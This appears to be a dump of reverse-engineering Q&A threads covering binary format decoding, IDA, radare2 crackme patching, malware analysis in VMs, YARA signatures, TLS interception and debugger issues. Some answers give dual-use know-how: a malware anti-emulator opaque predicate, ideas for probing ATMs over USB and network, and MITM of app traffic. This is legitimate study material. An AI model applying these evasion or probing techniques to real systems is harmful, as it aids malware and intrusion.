<code>\xff\xff\x05\x04test\x02A\x05test1@\x04\x03@@\x04\x05@0\x00\x00@\x05\x05test2\x03\x05\x05test1\x06@0\x00\x01@\x00</code></p>

<p>Here's what the table looks like in the proprietary software.</p>

<p><kbd>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</kbd><kbd>test1</kbd><kbd>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</kbd><br/>
<kbd>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</kbd><kbd>test1</kbd><kbd>test1</kbd><br/>
<kbd>test&nbsp;&nbsp;</kbd><kbd>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</kbd><kbd>test1</kbd><br/>
<kbd>test1</kbd><kbd>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</kbd><kbd>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</kbd><br/>
<kbd>test1</kbd><kbd>test2</kbd><kbd>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</kbd><br/>
<kbd>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</kbd><kbd>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</kbd><kbd>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</kbd><br/>
<kbd>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</kbd><kbd>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</kbd><kbd>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</kbd><br/>
<kbd>test1</kbd><kbd>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</kbd><kbd>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</kbd><br/>
<kbd>test1</kbd><kbd>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</kbd><kbd>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</kbd><br/>
<kbd>test1</kbd><kbd>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</kbd><kbd>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</kbd><br/>
<kbd>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</kbd><kbd>test1</kbd><kbd>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</kbd><br/>
<kbd>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</kbd><kbd>test1</kbd><kbd>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</kbd><br/>
<kbd>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</kbd><kbd>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</kbd><kbd>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</kbd><br/>
<kbd>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</kbd><kbd>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</kbd><kbd>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</kbd><br/>
<kbd>test1</kbd><kbd>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</kbd><kbd>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</kbd><br/>
<kbd>test1</kbd><kbd>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</kbd><kbd>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</kbd><br/></p>

<p>I was able to guess some of it:</p>

<ul>
<li>It's column by column then cell by cell, starting at the top left cell.</li>
<li>The <code>\x04</code> in <code>\x04test</code> seems to be the length (in bytes I guess) of the following word.</li>
<li><code>@</code> mean the last value</li>
</ul>

<p>Anyone knows if the data is following a standard or have any tips how to decode it?</p>

<p>Thanks!</p>

<p>Here's an example with python :</p>

<pre><code>from struct import unpack


def DecodeData(position):
    print ""position"", position
    firstChar = data[position:][:1]
    size_in_bytes = unpack('B', firstChar)[0]
    print ""firstChar: {0}. size_in_bytes: {1}"".format(repr(firstChar), size_in_bytes)
    return size_in_bytes


def ReadWord(position, size_in_bytes):
    word = unpack('%ds' % size_in_bytes, data[position:][:size_in_bytes])[0]
    print ""word:"", word

data = ""\xff\xff\x05\x04test\x02A\x05test1@\x04\x03@@\x04\x05@0\x00\x00@\x05\x05test2\x03\x05\x05test1\x06@0\x00\x01@\x00""

position = 0

print """"
position += 1
DecodeData(position)
print ""\\xff - ?""

print """"
position += 1
DecodeData(position)
print ""\\x05 - ?""

print """"
position += 1
size_in_bytes = DecodeData(position)
position += 1
ReadWord(position, size_in_bytes)


print """"
position += size_in_bytes
DecodeData(position)
position += 1
DecodeData(position)
print """"""'2A' : could be to say that ""test"" has 2 empty cells before it""""""

print """"
position += 1
size_in_bytes = DecodeData(position)
position += 1
word = unpack('%ds' % size_in_bytes, data[position:][:size_in_bytes])[0]
print ""word:"", word

position += size_in_bytes

DecodeData(position)
print """"""@: mean that there's another ""test1"" cell""""""

print """"
position += 1
DecodeData(position)
position += 1
DecodeData(position)
print ""\\x04\\x03 - Could be that the next value is 3 cells down""

print """"
position += 1
DecodeData(position)
print """"
position += 1
print ""@@ - Seems to mean 3 repetitions""

print """"
position += 1
DecodeData(position)
position += 1
DecodeData(position)
print ""\\x04\\x05 - Could be that the next value is 5 cells down""

print """"
position += 1
DecodeData(position)
print ""@ - repetition""

print """"
position += 1
DecodeData(position)

print """"
position += 1
DecodeData(position)
position += 1
DecodeData(position)
print ""\\x00\\x00 - That could mean to move to the first cell on the next column""

print """"
position += 1
DecodeData(position)
print ""@ - repetition""

print """"
position += 1
DecodeData(position)
print ""\\x05 - ?""

print """"
position += 1
size_in_bytes = DecodeData(position)
position += 1
word = unpack('%ds' % size_in_bytes, data[position:][:size_in_bytes])[0]
print ""word:"", word
position += size_in_bytes

print """"
DecodeData(position)
print ""\\x03 - Could be to tell that the pervious word 'test2' is 3 cells down""

print """"
position += 1
DecodeData(position)
print ""\\x05 - ?""

print """"
position += 1
size_in_bytes = DecodeData(position)
position += 1
word = unpack('%ds' % size_in_bytes, data[position:][:size_in_bytes])[0]
print ""word:"", word
position += size_in_bytes

print """"
DecodeData(position)
print ""\\x06 - Could be to tell that the pervious word 'test1' is 6 cells down""

print """"
position += 1
DecodeData(position)
print ""@ - repetition""

print """"
position += 1
DecodeData(position)
print ""\\0 - ?""

print """"
position += 1
DecodeData(position)
position += 1
DecodeData(position)
print ""\\x00\\x01 - Seems to mean, next column second cell""

print """"
position += 1
DecodeData(position)
print ""@ - repetition""

print """"
position += 1
DecodeData(position)
print ""\\x00 - end of data or column""
</code></pre>
","<p>Here's an explanation for what I think the individual symbols mean. I'm basing this around the presumption that a little selector is going through the cells, one by one.</p>

<ul>
<li><code>\xFF</code> = Null cell</li>
<li><code>\x05</code> = A string is following, with <code>\xNumber</code> coming after the string to define how far to displace the string from the selector's current position, if at all. </li>
<li><code>\xNumber string</code> = A string of length number</li>
<li><code>\x2A</code> = Could be a byte that says not to displace the current string, and also to assume that the next piece of data is defining a string to be placed in the next cell. Questionable meaning.</li>
<li><code>\x04 \xNumber</code> = Move selector ahead <code>\xNumber</code> cells and place previous string into there.</li>
<li><code>0 \x00 \x0Number</code> = New column, move selector into row <code>\xNumber</code>, and place previous string into there.
<code>@</code> = Place previously used string in the cell following the current one.</li>
</ul>

<p>So here's my interpretation of the data you're giving us:</p>

<ul>
<li><code>\xFF\xFF</code> = two null cells</li>
<li><code>\x05</code> = A cell, singular, with a string, placed following the null cells, because of the <code>\x2A</code> following the string </li>
<li><code>\x04 test</code> = The string.</li>
<li><code>\x2A \x05 test1</code> = Another string placed into the cell following. No number needed, since \x2A implies that it's being placed right after ""test""</li>
<li><code>@</code> = Place ""test1"" into the cell after the ""test1"" string was first placed.</li>
<li><code>\x04 \x03</code> = Move selector ahead three cells and place test1 where it lands.</li>
<li><code>@@</code> = Place into the two cells following also.</li>
<li><code>\x04 \x05 @</code> = Skip four cells, place into two cells.</li>
<li><code>0</code> = New column.</li>
<li><code>\x00 \x00 @</code> = Using string last defined (test1), place into first two cells of the column. </li>
<li><code>\x05 \x05 test2 \x03</code> = Place a cell three cells afterwords.</li>
<li><code>\x05\x05test1\x06</code> = Place test1 into a cell 6 after test2</li>
<li><code>@</code> = Place test1 again, too.</li>
<li><code>0</code> = move to next column</li>
<li><code>\x00\x01</code> = Place previous string at location 01 </li>
<li><code>@</code> = And also at location 02</li>
<li><code>\x00</code> = Done</li>
</ul>

<p>Explanation: My method was to look for a pattern, check if the pattern withstood further scrutiny - the first pattern I checked seemed to - and clear up any minor issues I had with it. Seems to have worked.</p>
","2004"
"Struct with negative offset in IDA possible","1374","","<p>I have a structure which looks like this:</p>

<pre><code> RefString struct
     RefCount dd ?
     StrLen   dd ?
     CString  db...
 RefString ends
</code></pre>

<p>When the code passes around a pointer, it doesn't point to the beginning of the struct (RefCount), instead it points to CString, which is allocated as a normal C-String with a zero terminating character, as well as having the strlen and a refcount. So when the code accesses the strlen or refcount it uses <code>ptr-4</code> respectively <code>ptr-8</code>.</p>

<p>Actually that's quite a nice construct, because this way the string can be used as a delphistring, but also directly passed to some system functions without the need of converting back and forth. </p>

<p>Now I wonder though, if it is possible in IDA to create a struct with the basepointer to the string and it knows that the other fields are with the negative offset.</p>
","<p>What you referring to as ptr-4 and ptr-8 are in fact location of singled out variables on stack. IDA has to know the structure in order to recognize it automatically. If you setup custom structure in ""Structures"" subview. Subsequently, You can manually set whatever variable you choose to be the type of that particular variable. Thereafter, IDA will replace references within disassembly view with appropriate offsets to the structure members.  </p>

<p>If IDA ""lands"" in what seems to be the middle of the structure. You could follow the work around below to make it display it differently:</p>

<blockquote>
  <ol>
  <li>invert the operand sign by pressing _ (underscore)</li>
  <li>select the instruction</li>
  <li>press T. provide calculated delta, select the desired structure and its field</li>
  </ol>
</blockquote>

<p>For details consult <a href=""http://www.hexblog.com/?p=63"" rel=""nofollow"">Negative structure offsets</a> of <a href=""http://www.hexblog.com"" rel=""nofollow"">Hex Blog</a>. </p>
","3016"
"Malware Hooking INT 1 and INT 3","1373","","<p>I understand that on x86, <code>INT 1</code> is used for single-stepping and <code>INT 3</code> is used for setting breakpoints, and some other interrupt (usually 0x80 for Linux and 0x2E for Windows) used to be used for system calls.  </p>

<p>If a piece of malware hooks the Interrupt Descriptor Table (IDT) and substitutes its own <code>INT 1</code> and <code>INT 3</code> handlers that perform system call-like functionality, how can I use a debugger to trace its execution?  Or am I stuck with using static-analysis tools?</p>
","<p>I would suggest this as a solution <a href=""http://accessroot.com/arteam/site/download.php?view.185"">http://accessroot.com/arteam/site/download.php?view.185</a> as I had similar problem in one of crackmes. What I did was to write my own hooks for SoftICE to bypass ring0 hooks of int 3 and int 1. Could be useful for your problem. Interesting section is ""SoftICE comes to the rescue"".</p>
","1433"
"How to design opaque predicates?","1370","","<p>Opaque predicate are used to disrupt automatic analysis of the binary code by reaching the limits of what can do an analyzer.</p>

<p>Can somebody give an example (or a few examples) of an opaque predicate found in a real-life case ? And, what are the methods used to build new opaque predicates ?</p>
","<p>One opaque predicate I found in a malware sample years ago:</p>

<pre><code>SetErrorMode(1024);
if ( SetErrorMode(0) == 0 )
  SayHiToEmulator();
DoRealStuff();
</code></pre>

<p>As for the other question, how to build new opaque predicates, I think it depends on the kind of analyser you want to disrupt. It's different to disrupt a static code analyser designed to find bugs than disrupting an emulator designed to mimic the environment where a malware should run in.</p>

<p>But, let's say that you want to disrupt malware emulators: you can build a list of APIs from the most common libraries (kernel32.dll, advapi32.dll, user32.dll, etc...), create a batch of proves where you execute those APIs changing the arguments and checking the return values and generated exceptions, if any, and save the results. Then check the results of such APIs and find candidates: For example, a return value related to the input to such APIs is a good candidate for an opaque predicate. Specific conditions (exceptions or return values) that only happen rarely and with certain specific inputs are even better. Just some ideas...</p>
","2344"
"IDA is not recognizing cross references","1368","","<p>In the IDA view I see (<code>glb_SomeVar</code> is a byte array):</p>

<pre><code>cmp al, glb_SomeVar+22h
</code></pre>

<p>But when I hit <kbd>x</kbd> to find the cross references of glb_SomeVar, I only find two other matches in the same function:</p>

<pre><code>cmp al, glb_SomeVar+0Ah
cmp al, glb_SomeVar+0Bh
</code></pre>

<p>Is there a way to fix this, like making IDA re-analyze the selected function or even the whole code? I guess at other places, there are cross references missing too.</p>
","<p>Edit -> Global -> Cross-references -> Cross reference depth. Increase as applicable.</p>

<p>From <a href=""https://www.hex-rays.com/products/ida/support/idadoc/607.shtml"">the documentation</a>:</p>

<pre><code>    This value ""how many bytes of an object to look at to collect
    cross references"". For example we have an array:
            A       db 100 dup(0)
    If some instruction refers to the 5-th element of the array:
            mov     al,A+5
     with TD=3      we'll have no xrefs displayed
     with TD=10     we'll have this xref

   IDA.CFG parameter: MAX_TAIL
</code></pre>

<p>""TD"" here refers to ""tail depth"" (old name of the setting)</p>
","2131"
"Binary patching using radare2 in debug mode","1367","","<p>Im a newbe in radare and while I tried to patch a crackme binary, I opened it the first time in debug mode (-d), while debugging I used oo+ to reopen it with write mode, when I modify an instruction using wx, it works but when I quit it gives me two confirmation messages with yes no I press enter two times, then it get back to the original stat, and loose the modification, 
How could I keep changes even after quitting ???</p>
","<p>I just tried opening a binary file and patching and it actually saves my patches. The steps I followed are:</p>

<pre><code>[99:99:99] &lt;myuser&gt;:answer $ cp crackme0x00 crackme0x00_patched
[99:99:99] &lt;myuser&gt;:answer $ radare2 -Aw crackme0x00_patched
[0x08048360]&gt; pdf@sym.main 
[0x08048360]&gt; 0x08048487
[0x08048487]&gt; wa ret
Written 1 bytes (ret) = wx c3
[0x08048487]&gt; q
[99:99:99] &lt;myuser&gt;:answer $ cmp -l crackme0x00 crackme0x00_patched | gawk '{printf ""%08X %02X %02X\n"", $1, strtonum(0$2), strtonum(0$3)}' 
00000488 E8 C3
</code></pre>

<p>(I stole the compare script from <a href=""https://superuser.com/questions/125376/how-do-i-compare-binary-files-in-linux"">here</a>)</p>

<p>As you can see, in my case the binary remains patched even after quitting (<code>C3</code> is the opcode for the <code>ret</code> instruction. Instead of reopening the file with <code>oo+</code> as you did, I opened it in write mode with <code>w</code> and <code>A</code> (equivalent of <code>aaa</code>). I just tried myself and I <strong><em>couldn't</em></strong> patch binaries and save them (if anyone can give a more accurate explaination is welcome).</p>
","14221"
"How to reverse engineer an ATM?","1367","","<p>This question is using ATMs as an example, but it could apply to any number of 'secure' devices such as poker machines, E-voting machines, payphones etc. </p>

<p>Given that ATMs are relatively hardened (in comparison to say, most consumer electronics for example), what would be the process of reverse engineering a device in a black-box AND limited access scenario?</p>

<p>Given that traditionally, an end user of a device such as an ATM will only ever have access to the keypad/screen/card input/cash outlet (at a stretch, access to perhaps the computer housed in the top of the plastic casing(think private ATMs at small stores etc)), it seems like most attack vectors are quite limited. Under these types of circumstances, what could be done to reverse, understand and potentially exploit hardened, limited access systems?</p>

<p>Is the 'ace up the sleeve' kind of situation here physical access to the ATM components? Or is there a way to RE a device from within the environment a user is presented?</p>
","<p>Some information might be found in Barnaby Jack's BlackHat presentation: </p>

<ul>
<li><a href=""http://www.youtube.com/watch?v=Ss_RWctTARU"" rel=""nofollow"">Jackpotting Automated Teller Machines (Youtube)</a></li>
</ul>

<blockquote>
  <p>The most prevalent attacks on Automated Teller Machines typically involve the use of card skimmers, or the physical theft of the machines themselves. Rarely do we see any targeted attacks on the underlying software. </p>
</blockquote>

<p>Can't find the presentation or the whitepaper atm (no pun intended), but I'm sure you'll get some information/directins from the talk.</p>

<p>Apart from this kind of reversing where you can do whatever you want with the machine, if you just have limited access to it (can't open it or whatever), I guess your best bet would be to play around with what's available. Some of those machines have USB ports for peripherals with which you could play. Something like <a href=""http://www.pjrc.com/teensy/"" rel=""nofollow"">Teensy</a> might come in handy for automating stuff. </p>

<p>Also, most of those machines can be connected to some sort of a network, so scanning, sniffing and similar tricks could yield more results. </p>

<p>Be careful with what (or who's machines ) you play with, don't be <a href=""http://web.archive.org/web/20130423212041/http://labofapenetrationtester.blogspot.in/2013/04/what-bored-hacker-did-on-plane.html"" rel=""nofollow"">this guy</a>. </p>
","2024"
"Is it possible to decompile the password protected rar file?","1367","","<p>I'm trying to crack winrar's password using some methods as explained below.</p>

<p>Because rar uses AES-128 encryption, brute-force and dictionary attacks are useless as they would take years.
But, if we convert a password-protected rar file into an SFX archive </p>

<p>I used w32dasm, olly dbg &amp; pe explorer to modify these exe files.
All I could find are the strings like ""Extracting, CRC failed, Encrypted"" and some other things. I used several sfx archives as test files (with different passwords) and tried it through disassembly. Those hexadecimal keys are looking quite similar!</p>

<p>So do I need a better disassembler or debugger?Am i on the right way or anyother way to decompile it.</p>

<p>My main aim was to extract the password protected file and ensure the file is safe,I already refered this <a href=""https://superuser.com/questions/145167/is-zips-encryption-really-bad"">question</a> stating that it is possible only by brute forcing the winrar file.</p>

<p>Some of my win32dasm snapshots were as below :</p>

<p><a href=""https://i.stack.imgur.com/sfJNk.jpg"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/sfJNk.jpg"" alt=""enter image description here""></a></p>
","<blockquote>
  <p>Is it possible to decompile the password protected rar file?</p>
</blockquote>

<p>Decompilation is for code. RAR files are data. So <strong>no</strong>, there's nothing in a RAR file to decompile.</p>

<blockquote>
  <p>But, if we convert a password-protected rar file into an SFX archive</p>
</blockquote>

<p>Then you could decompile the SFX stub, but it still wouldn't allow you to decrypt the RAR data without the password.</p>
","9552"
"How to create a virus signature from decompiled source","1364","","<p>I have a problem where I have to create a virus signature for the Stoned Virus (Although this could apply to any virus/file).</p>

<p>Let's assume I have a copy of the compiled and decompiled program. I then proceed to identify the most important parts of the virus, that will always be present, in the code. As I understand it I now have to find the corresponding bytes in the compiled virus in order to create a byte signature for that critical part of the virus.</p>

<p>How do I proceed to find the corresponding bytes in the compiled source from the code that I identified in the decompiled version?</p>

<p>Extra:</p>

<ul>
<li>The code is in assembly</li>
<li>Simply using a hash signature for the entire file is not an option</li>
<li>Currently I only have the assembly code, but I can always compile this</li>
<li>I am aware that Stoned would usually be located in the boot sector and not in a file. This is only an academic exercise and would be relevant to any virus.</li>
</ul>

<p>EDIT:</p>

<p>The purpose of this is to be able to create virus signatures that can be used to scan a file system to find infected files as well as possibly infected files and variations of the virus code. For this reason I cannot simply use a hash of the entire file and I need to use specific parts of the virus. I can identify those parts but I do not know how to find the matching bytes in the machine code for the viral parts I identified.</p>
","<p>There are a number of ways to do this. Some people new to signature scanning use MD5 hashes of the entire file. This is <em>VERY</em> flawed, due to the switching of registers or even just the timestamp of the file would change the entire signature.</p>

<p>Another method often used is YARA ( <a href=""http://plusvic.github.io/yara/"" rel=""nofollow"">http://plusvic.github.io/yara/</a> ).
A good example from their webpage:</p>

<pre><code>rule silent_banker : banker
{
    meta:
        description = ""This is just an example""
        thread_level = 3
        in_the_wild = true

    strings:
        $a = {6A 40 68 00 30 00 00 6A 14 8D 91}
        $b = {8D 4D B0 2B C1 83 C0 27 99 6A 4E 59 F7 F9}
        $c = ""UVODFRYSIHLNWPEJXQZAKCBGMT""

    condition:
        $a or $b or $c
}
</code></pre>

<p>Here they say that one of the A, B or C bytes should be within the file.</p>

<p>Another method used (however this is more a Heuristic method) is to detect the ways it tries to hide. Eg obfuscation, encryption odd jumps (like pop, ret to jump to addresses).</p>

<p>Another method used often, (although this is less signature based) is IOC, for this see: <a href=""http://www.openioc.org/"" rel=""nofollow"">http://www.openioc.org/</a></p>

<p>I think you are looking for YARA.
Note for writing YARA signatures, good malware/exploits authors randomize everything they can. So try to find the parts that are 'unchangeable'.</p>
","4395"
"Malware in virtual machines","1364","","<p>Once I perform static analysis on a malware sample, I next run it in a virtual machine.</p>

<ul>
<li>Does this give the malware a chance to spread to the real machine?</li>
<li>Does this give the malware a chance to spread across networks?</li>
<li>What steps/tips can I follow to prevent the malware from spreading from the VM?</li>
</ul>

<p>I use VMwareW.</p>
","<p>The malware can propagate from the VM to the host in several circumstances:</p>

<ul>
<li>If there's a bug in the VM software. That's not very common, but it's possible.</li>
<li>If there's a bug in the host OS. A bug that specifically allows malware to break out of a VM is unlikely but again possible.</li>
<li>If there's a bug in the processor. That's even more unlikely but still not mathematically impossible.</li>
<li>If there's a way for the malware to exchange information with the host. This can be over the network; in this respect, there's no difference between using a VM and using a separate physical machine, so you need to firewall the VM appropriately (allow only the bare minimum, don't do anything that might allow the server to hijack the client such as SSH with X forwarding). Another vector is via the VM tools such as file and clipboard sharing: the software running in the VM might read and write shared files, access the host clipboard, etc. So when running malware in a VM you should disable all these convenience tools (disable them in the VM configuration, it's not enough to refrain from installing the guest software since the malware could come with its own).</li>
</ul>

<p>For more on that topic, read <a href=""https://security.stackexchange.com/questions/9011/does-a-virtual-machine-stop-malware-from-doing-harm"">https://security.stackexchange.com/questions/9011/does-a-virtual-machine-stop-malware-from-doing-harm</a> and <a href=""https://security.stackexchange.com/questions/12546/is-it-safe-to-install-malware-in-a-vm"">https://security.stackexchange.com/questions/12546/is-it-safe-to-install-malware-in-a-vm</a></p>

<p>All in all, most malware can be analyzed safely in a properly configured virtual machine. Disable all guest features and don't connect to the VM with any protocol that allows the server to influence the client. Firewall the VM as if it was hostile (it is); you should use a host-only network so that you can easily control what goes there.</p>

<p>There's another reason why you might prefer a physical machine to a virtual machine. There's quite a bit of malware that attempts to detect whether it's being analyzed, and doesn't behave maliciously when it is. Obvious, common things that malware tries to detect is signs that it's running under a debugger: check if it's being ptraced (or the Windows equivalent), check for sudden pauses in the execution, … And some malware looks for telltale signs of a VM, such as drivers for hardware that common VM software emulates, or CPU oddities that are inexistent or rare outside emulated CPUs. This isn't to say that you cannot analyze malware in a VM: sometimes you can, sometimes you can't, it depends on the malware. If you start in a VM and find nothing you need to be prepared to move to a physical machine.</p>

<p>Note that there are risks with a physical machine too: malware could attempt to <a href=""https://security.stackexchange.com/questions/7204/is-making-a-clean-install-enough-to-remove-potential-malware"">plant itself</a> into one of the <a href=""https://security.stackexchange.com/questions/25473/where-can-a-virus-or-other-malware-hide-on-common-pc-and-mac-hardware"">many pieces of firmware</a> on the motherboard and <a href=""http://semiaccurate.com/2009/07/31/apple-keyboard-firmware-hack-demonstrated/"" rel=""nofollow noreferrer"">peripherals</a>. Toolkits for this are beginning to emerge, such as <a href=""http://www.toucan-system.com/research/blackhat2012_brossard_hardware_backdooring.pdf"" rel=""nofollow noreferrer"">Rakshasa</a> and <a href=""https://security.stackexchange.com/questions/7181/does-the-mebromi-bios-flashing-rootkit-mean-apts-for-personal-computers-are-here"">Mebromi</a>. So if you analyze some sophisticated malware on a physical machine, don't trust this physical machine any more, ever.</p>
","2519"
"Who was the Old Red Cracker?","1361","","<p>I have heard countless stories on the Old Red Cracker, also known as +ORC, being the founding father of reverse engineering tutorials.</p>

<p>I also read somewhere that he left some riddles to find his ""secret page"" and he disappeared into thin air.</p>

<p>Did anyone <em>really</em> solve these riddles? Is the identity, or some of the background, of that person known?</p>
","<p>Yes, the riddle was solved. See <a href=""http://www.home.aone.net.au/~byzantium/found/found4.html"" rel=""nofollow"">http://www.home.aone.net.au/~byzantium/found/found4.html</a></p>

<p>As for +ORC himself, there's some more info at <a href=""http://www.woodmann.com/crackz/Orc.htm"" rel=""nofollow"">http://www.woodmann.com/crackz/Orc.htm</a></p>

<p>The last time I spoke with Fravia+ about +ORC, Fravia+ said that +ORC became obsessed with the pyramids in Egypt and went there to study them. He contracted some kind of illness while there and died rather suddenly. If I remember correctly, Fravia+ learned of +ORC's death through +ORC's son.</p>
","2430"
"Decryping TLS packets between Windows 8 apps and Azure","1355","","<p>In Windows Store application development for Windows 8, there is a class called remoteSettings that lets a developer store batches of data so that the user will have access to it across several machines, as long as they are logged in with the same account. </p>

<p>I hooked up WireShark and discovered that the packet is stored in Azure, and is secured with TLS. I would like to MITM myself so that I can decrypt the packet and see if the data in encrypted on Azure.</p>

<p>I obviously don't have the private key for Azure, so I'd like to know if anyone has an idea on how to accomplish that MITM analysis.</p>
","<p>If the data is being passed as HTTPS you could try the classic <a href=""http://www.fiddler2.com/fiddler2/"" rel=""nofollow"">Fiddler</a> man-in-the-middle approach. I'm not sure whether the Windows store respects the proxy settings or whether it has a pinned certificate. If it does respect the proxy settings, which it should, and it doesn't have a pinned certificate you should be able to trivially man-in-the-middle it with Fiddler.</p>

<p>If the data isn't HTTPS and the cerificate isn't pinned, one option is to proxy the secure connection using <a href=""http://www.gomor.org/bin/view/GomorOrg/SslNetcat"" rel=""nofollow"">SSLNetcat</a>. What you do is that you change your hosts file so that the Store executable connects to SSLNetcat running locally, then you set up SSLNetcat such that it uses a cerificate for which you have the private key. Then you either just have SSLNetcat forward the data directly to a program of your choice or enter the private keys into Wireshark and use it to sniff the traffic.</p>

<p>If the data isn't HTTPS, if the cerificate in the binary is pinned and not stored in a file, you can either patch the Windows Store executable and replace the certificate with your own for which you have the private key. OpenSSL should be able to generate a replacement certificate for you easily. This private key can then be entered into Wireshark which will then decrypt the traffic.</p>

<p>You're fairly close to copy protection territory so you might run into a number of complications.</p>
","223"
"Can not continue debugging after SIGTRAP","1352","","<p>I am trying to debug an iOS app with gdb and when I hit a breakpoint I get this error, and can not continue.</p>

<pre><code>Program received signal SIGTRAP, Trace/breakpoint trap.
[Switching to process 190 thread 0x6fa7]
0x000ae150 in dyld_stub_pthread_key_create ()
</code></pre>

<p>Does anyone know how I can continue debugging without closing and opening back gdb?</p>
","<p>This could happen if your breakpoint address is in the ""middle"" of the opcode, for example if your asm code looks like this:</p>

<pre><code>0x000C: BLX   R3
0x000E: LDR   R0, [R6]
</code></pre>

<p>and you put breakpoint on address 0x00D, in this case the process will get SIGTRAP on other address than 0x000D, but gdb only knows the 0x00D address from the user input so its just throw SIGTRAP and get stuck.</p>

<p>Also even when you write the right address to gdb, the arm fallback mode of gdb can cause this kind of problems. </p>

<pre><code>set arm fallback-mode (arm|thumb|auto)
GDB uses the symbol table, when available, to determine whether instructions are ARM or Thumb. This command controls GDB’s default behavior when the symbol table is not available. The default is ‘auto’, which causes GDB to use the current execution mode (from the T bit in the CPSR register).
</code></pre>

<p>Some times gdb cant get the arm mode of a function automatically, and it falling to the wrong mode. You can check this by disassemble piece of code in gdb and check if you see normal assembly or some bad one. if its bad one then your arm assembly mode is wrong, and you can get false SIGTRAP.</p>

<p>Another advice is not to use gdb in iOS, use lldb. gdb is depreciated, and the only gdb versions available to iOS are ports thats individual people wrote, those ports lack in features (for example some of them don't have the fallback feature at all), and are unreliable.  </p>
","6533"
"Viewing memory permissions in Ollydbg for memory segments","1349","","<p>I'm looking for a way to view memory permissions on a specific section of memory using OllyDbg (technically I'm using Immunity but I'm assuming if it exists in Olly it'll be the same there).</p>

<p>The program I'm looking at is calling VirtualProtect to make a block of code go RW->RWE, but the result looks like the protection is extending to 4 bytes before the address passed in as a parameter. I checked the MSDN and it said that there is a rounding/boundary extension with t VirtualProtect with respect to the size, but it doesn't say specifically how the extensions get propagated across pages.</p>

<p>I'm confident that's what's happening but I wanted to look at the memory permissions for the specific segment to confirm. It doesn't look like the Memory map refreshes after the call to VP and I couldn't find another place to show the memory permissions. On WinDbg I can do something like !vprot so I was curious if there was something similar here.</p>
","<p><code>ollydbg 1.10</code> automatically refreshes the memory window when protection attributes are changed if the address that is passed on to VirtualProtect lies in the first allocated page</p>

<p>if subsequent page's attributes were changed using Virtualprotect ollydbg's memory window wont reflect them as it shows the complete allocated Size as one contiguous dump  </p>

<p>windbg <code>!vprot</code> will show the modified protection attributes only if you traverse page by page</p>

<p>in <code>ollydbg 2.01</code> memory window will show attribute changes page by page automatically</p>

<p>an example</p>

<pre><code>int _tmain(int argc, _TCHAR* argv[])
{
    printf(""lets valloc \n"");
    PCHAR foo;
    foo = (PCHAR)VirtualAlloc(0,0x1004,MEM_COMMIT,PAGE_READONLY);
    printf(""we valloced lets vprot\n"");
    DWORD oldprot;
    if (  (VirtualProtect(foo+0x1000,1,PAGE_EXECUTE_READWRITE,&amp;oldprot) == FALSE) )
    {
        printf(""our vprot failed\n"");
        return FALSE;
    }
    if (  (VirtualProtect(foo+0xfff,1,PAGE_EXECUTE_READWRITE,&amp;oldprot) == FALSE) )
    {
        printf(""our vprot failed\n"");
        return FALSE;
    }
    printf(""we vprotted fine \n"");
    return 0;
}
</code></pre>

<p><strong>ollydbg 1.10 memory window Display will be same after VirtualAlloc and after first Virtualprotect</strong></p>

<p><strong>display will change only after second VirtualProtect</strong></p>

<pre><code>Memory map, item 19
 Address=003A0000
 Size=00002000 (8192.)
 Owner=         003A0000 (itself)
 Section=
 Type=Priv 00021002
 Access=R
 Initial access=R
</code></pre>

<p>after second Virtualprotect</p>

<pre><code>Memory map, item 19
 Address=003A0000
 Size=00002000 (8192.)
 Owner=         003A0000 (itself)
 Section=
 Type=Priv 00021040
